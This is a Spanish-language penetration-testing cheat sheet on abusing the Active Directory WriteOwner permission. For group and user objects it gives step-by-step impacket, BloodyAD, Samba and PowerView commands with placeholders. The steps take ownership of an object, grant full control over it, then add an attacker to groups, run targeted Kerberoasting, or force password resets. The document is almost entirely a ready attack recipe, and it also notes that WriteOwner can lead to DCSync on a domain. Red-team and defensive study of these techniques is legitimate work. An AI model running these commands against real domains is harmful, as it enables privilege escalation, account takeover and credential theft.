## Abuso de WriteOwner

`WriteOwner` permite cambiar el propietario de un objeto de Active Directory a cualquier principal controlado por el atacante. Una vez que se asume la propiedad, se puede modificar la DACL del objeto para otorgarse `Full Control` — lo que abre todos los vectores de ataque posteriores.

**Impacto según el tipo de objeto:**

| Objeto objetivo | Consecuencia |
| --------------- | ------------ |
| Grupo | Añadirse a sí mismo o a otros al grupo |
| Usuario | Control total sobre la cuenta (Kerberoast, cambio de contraseña) |
| Equipo | Acceso y control sin restricciones |
| Dominio | Operación DCSync — extracción de todos los hashes |

**El ataque siempre sigue dos pasos:**
1. Tomar la propiedad del objeto (`owneredit`)
2. Otorgarse permisos completos sobre él (`dacledit`) y explotar

---

## WriteOwner sobre un Grupo

### Desde Linux (externamente — recomendado)

**Paso 1 — Tomar la propiedad del grupo**

```shell
impacket-owneredit -action write -new-owner '<usuario_controlado>' \
  -target-dn 'CN=<grupo_objetivo>,CN=Users,DC=<dominio>,DC=<tld>' \
  '<dominio>/<usuario_controlado>:<contraseña>' -dc-ip <ip_dc>
```

**Paso 2 — Otorgarse permisos de escritura sobre el grupo**

```shell
impacket-dacledit -action 'write' -rights 'WriteMembers' \
  -principal '<usuario_controlado>' \
  -target-dn 'CN=<grupo_objetivo>,CN=Users,DC=<dominio>,DC=<tld>' \
  '<dominio>/<usuario_controlado>:<contraseña>' -dc-ip <ip_dc>
```

**Paso 3 — Añadirse al grupo**

```shell
# Samba tools
net rpc group addmem '<grupo_objetivo>' '<usuario_controlado>' \
  -U '<dominio>'/'<usuario_controlado>'%'<contraseña>' -S <ip_dc>

# BloodyAD
bloodyAD --host '<ip_dc>' -d '<dominio>' -u '<usuario_controlado>' -p '<contraseña>' \
  add groupMember '<grupo_objetivo>' '<usuario_controlado>'
```

### Desde Windows (internamente)

```powershell
# Cargar PowerView
powershell -ep bypass
Import-Module .\PowerView.ps1

# Tomar la propiedad
Set-DomainObjectOwner -Identity '<grupo_objetivo>' -OwnerIdentity '<usuario_controlado>'

# Otorgarse Full Control
Add-DomainObjectAcl -Rights 'All' -TargetIdentity '<grupo_objetivo>' -PrincipalIdentity '<usuario_controlado>'

# Añadirse al grupo
net group '<grupo_objetivo>' <usuario_controlado> /add /domain
```

---

## WriteOwner sobre un Usuario

Una vez tomada la propiedad y otorgado `Full Control`, las opciones de explotación son las mismas que con `GenericAll` sobre usuario.

**Orden de prioridad recomendado:**
1. Shadow Credentials (obtener hash NT)
2. Targeted Kerberoast (obtener hash Kerberoastable)
3. Cambio de contraseña (último recurso)

### Desde Linux (externamente — recomendado)

**Paso 1 — Tomar la propiedad del usuario**

```shell
impacket-owneredit -action write -new-owner '<usuario_controlado>' \
  -target-dn 'CN=<usuario_objetivo>,CN=Users,DC=<dominio>,DC=<tld>' \
  '<dominio>/<usuario_controlado>:<contraseña>' -dc-ip <ip_dc>
```

**Paso 2 — Otorgarse Full Control sobre el usuario**

```shell
impacket-dacledit -action 'write' -rights 'FullControl' \
  -principal '<usuario_controlado>' \
  -target-dn 'CN=<usuario_objetivo>,CN=Users,DC=<dominio>,DC=<tld>' \
  '<dominio>/<usuario_controlado>:<contraseña>' -dc-ip <ip_dc>
```

**Paso 3 — Explotar (elegir uno)**

```shell
# Kerberoast
targetedKerberoast.py -v -d '<dominio>' -u '<usuario_controlado>' -p '<contraseña>'

# Cambio de contraseña con Samba
net rpc password '<usuario_objetivo>' '<nueva_contraseña>' \
  -U '<dominio>'/'<usuario_controlado>'%'<contraseña>' -S <ip_dc>

# Cambio de contraseña con BloodyAD
bloodyAD --host '<ip_dc>' -d '<dominio>' -u '<usuario_controlado>' -p '<contraseña>' \
  set password '<usuario_objetivo>' '<nueva_contraseña>'
```

### Desde Windows (internamente)

```powershell
# Tomar la propiedad
Set-DomainObjectOwner -Identity '<usuario_objetivo>' -OwnerIdentity '<usuario_controlado>'

# Otorgarse Full Control
Add-DomainObjectAcl -Rights 'All' -TargetIdentity '<usuario_objetivo>' -PrincipalIdentity '<usuario_controlado>'

# Kerberoast
$User = Get-DomainUser '<usuario_objetivo>'
$User | Get-DomainSPNTicket | fl

# Cambio de contraseña
$NewPassword = ConvertTo-SecureString '<nueva_contraseña>' -AsPlainText -Force
Set-DomainUserPassword -Identity '<usuario_objetivo>' -AccountPassword $NewPassword
```

> 💡 `WriteOwner` es un permiso que a menudo se ignora en BloodHound porque requiere dos pasos antes de ser explotable — pero su impacto final es equivalente a `GenericAll` una vez completados.

---

### Referencias

- https://www.hackingarticles.in/abusing-ad-dacl-writeowner/
- https://bloodhound.specterops.io/resources/edges/write-owner
- https://www.thehacker.recipes/ad/movement/dacl/write-owner
